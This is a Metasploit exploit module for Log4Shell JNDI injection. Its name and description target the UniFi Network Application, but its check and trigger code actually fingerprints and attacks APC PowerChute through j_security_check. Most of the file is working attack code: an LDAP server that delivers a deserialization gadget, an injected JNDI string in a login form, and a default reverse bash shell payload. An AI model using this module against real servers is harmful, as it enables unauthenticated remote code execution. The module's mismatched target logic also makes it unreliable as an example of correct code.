##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Log4Shell
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(_info = {})
    super(
      'Name' => 'UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)',
      'Description' => %q{
        The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell
        vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the
        /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java
        object. This results in OS command execution in the context of the server application.

        This module will start an LDAP server that the target will need to connect to.
      },
      'Author' => [
        'Spencer McIntyre', # JNDI/LDAP lib stuff
        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff
        'ErikWynter' # Module
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
        [ 'URL', 'https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi' ],
        [ 'URL', 'https://github.com/puzzlepeaches/Log4jUnifi' ],
        [ 'URL', 'https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1' ]
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 6547,
        'SSL' => true,
        'WfsDelay' => 30
      },
      'DefaultTarget' => 1,
      'Targets' => [
        [
          'Windows', {
            'Platform' => 'win'
          },
        ],
        [
          'Unix', {
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          },
        ]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => [REPEATABLE_SESSION]
      }
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'Base path', '/'])
    ])
  end

  def wait_until(&block)
    datastore['WfsDelay'].times do
      break if block.call

      sleep(1)
    end
  end

  def check
    validate_configuration!
    # PowerChute isn't easily fingerprinted but it requires a series of redirects, so let's follow those to descrease the changes of targeting the wrong service
    res = send_request_cgi('uri' => normalize_uri(target_uri))
    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?

    unless res.redirect? && res.headers['Location'] =~ /\/status;[a-f0-9]{16}=node/
      return Exploit::CheckCode::Safe('The target does not seem to be APC PowerChute.')
    end

    # let's visit the status page to get another redirect
    res = send_request_cgi('uri' => normalize_uri(target_uri, 'status'))
    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?

    unless res.redirect? && res.headers['Location'] =~ /\/logon;[a-f0-9]{16}=node/
      return Exploit::CheckCode::Safe('The target may be APC PowerChute, but does not appear to be a supported version.')
    end

    # let's visit the logon page
    res = send_request_cgi('uri' => normalize_uri(target_uri, 'logon'))
    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?

    unless res.code == 200 && res.body.include?('/images/apc.png?')
      return Exploit::CheckCode::Safe('The target may be APC PowerChute, but does not appear to be a supported version.')
    end

    # try to get the version
    version = res.body.scan(/\/images\/apc\.png\?([\d\.]+)"\>/)&.flatten&.first
    return Exploit::CheckCode::Detected('The target may be APC PowerChute, but the version could not be obtained.') if version.blank?
    
    # the patch is 10.0.5.*
    # let's check the no of dots
    case version.split('.').count
    when 3
      if Rex::Version.new(version) >= Rex::Version.new('10.0.5')
        return Exploit::CheckCode::Safe("The target is likely APC PowerChute #{version}. The patch was introduced in 10.0.5")
      end
    when 4
      if Rex::Version.new(version) >= Rex::Version.new('10.0.5.0')
        return Exploit::CheckCode::Safe("The target is likely APC PowerChute #{version}. The patch was introduced in 10.0.5")
      end
    else
      return Exploit::CheckCode::Detected("The target is likely APC PowerChute. However, the obtained version number #{version} is not recognized. The patch was introduced in 10.0.5")
    end

    print_status("The target appears to be APC PowerChute #{version}. Attempting to trigger the vulnerability...")

    start_service
    res = trigger
    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?

    wait_until { @search_received }
    @search_received ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Unknown('No LDAP search query was received.')
  ensure
    cleanup_service
  end

  def build_ldap_search_response_payload
    return [] if @search_received

    @search_received = true

    return [] unless @exploiting

    print_good('Delivering the serialized Java object to execute the payload...')
    # build_ldap_search_response_payload_inline('BeanFactory')
    # build_ldap_search_response_payload_inline('CommonsBeanutils1')
    build_ldap_search_response_payload_inline('CommonsCollections1')
    # build_ldap_search_response_payload_inline('CommonsCollections2')
    # build_ldap_search_response_payload_inline('CommonsCollections3')
    # build_ldap_search_response_payload_inline('CommonsCollections4')
    # build_ldap_search_response_payload_inline('CommonsCollections5')
    # build_ldap_search_response_payload_inline('CommonsCollections6')
    # build_ldap_search_response_payload_inline('CommonsCollections7')
    # "AspectJWeaver",
    # "BeanShell1",
    # "C3P0",
    # "Click1",
    # "Clojure",
    # "CommonsBeanutils1",
    # "CommonsCollections1",
    # "CommonsCollections2",
    # "CommonsCollections3",
    # "CommonsCollections4",
    # "CommonsCollections5",
    # "CommonsCollections6",
    # "CommonsCollections7",
    # "FileUpload1",
    # "Groovy1",
    # "Hibernate1",
    # "Hibernate2",
    # "JBossInterceptors1",
    # "JSON1",
    # "JavassistWeld1",
    # "Jdk7u21",
    # "Jython1",
    # "MozillaRhino1",
    # "MozillaRhino2",
    # "Myfaces1",
    # "Myfaces2",
    # "ROME",
    # "Spring1",
    # "Spring2",
    # "URLDNS",
    # "Vaadin1",
    # "Wicket1",
    # "frohoff/ysoserial#168"
  end

  def trigger
    @search_received = false
    # HTTP request initiator
    send_request_cgi(
      'uri' => normalize_uri(target_uri, 'j_security_check'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'j_username' => rand_text_alphanumeric(8..16), # can not be blank!,
        'j_password' => rand_text_alphanumeric(8..16), # can not be blank!
        'login' => 'Log On',
        'formtoken' => log4j_jndi_string,
        'formtokenid' => '/logon_formtoken',
      }
    )
  end

  def exploit
    validate_configuration!

    @exploiting = true
    start_service
    res = trigger
    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?

    unless res.code == 401
      fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way')
    end

    wait_until { @search_received && (!handler_enabled? || session_created?) }
    handler
  end
end
